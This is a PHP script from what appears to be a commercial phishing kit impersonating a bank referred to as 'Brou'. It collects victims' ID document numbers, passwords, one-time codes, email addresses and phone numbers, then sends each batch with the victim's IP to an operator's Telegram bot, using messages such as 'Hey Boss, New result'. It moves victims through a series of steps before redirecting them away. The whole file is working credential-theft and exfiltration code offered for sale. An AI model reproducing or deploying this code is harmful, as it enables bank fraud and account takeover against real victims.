<?php 
require 'edit.php';
require 'func.php';
$ip = getIp();
if (isset($_POST['tipodoc'])) {
	$msg = "|Hey Boss, New result Brou \n|Tipo doc.: ".$_POST['tipodoc']."\n|Doc.: ".$_POST['numdoc']."\n|Clav.: ".$_POST['clv']."\n|IP: ".$ip."\r\n|Thanks For Buying From Me";
	 $url = "https://api.telegram.org/bot$tokenBot/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg).""; 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 
	header("Location: step2");exit();
}elseif (isset($_POST['c1'])) {
	$msg = "|Hey Boss, 1st Otp \n|Code.: ".$_POST['c1']."".$_POST['c2']."".$_POST['c3']."".$_POST['c4']."".$_POST['c5']."".$_POST['c6']." \n|IP: ".$ip."\r\n";
	 $url = "https://api.telegram.org/bot$tokenBot/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg).""; 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 
	header("Location: step4");exit();

}elseif(isset($_POST['email'])){
	$msg = "|Hey Boss, info \n|C0rr3.: ".$_POST['email']."\nT3L:".$_POST['celular']." \n|IP: ".$ip."\r\n";
	
	 $url = "https://api.telegram.org/bot$tokenBot/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg).""; 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 
	header("Location: step5");exit();
}elseif (isset($_POST['c123'])) {
	$msg = "|Hey Boss, 3rd Otp \n|Code.: ".$_POST['c123']."".$_POST['c2']."".$_POST['c3']."".$_POST['c4']."".$_POST['c5']."".$_POST['c6']." \n|IP: ".$ip."\r\n";
	 $url = "https://api.telegram.org/bot$tokenBot/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg).""; 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 
	header("Location: https://ppt.cc/f1m0Kx");exit();
}else{
	echo 'issue';
	var_dump($_POST);
}
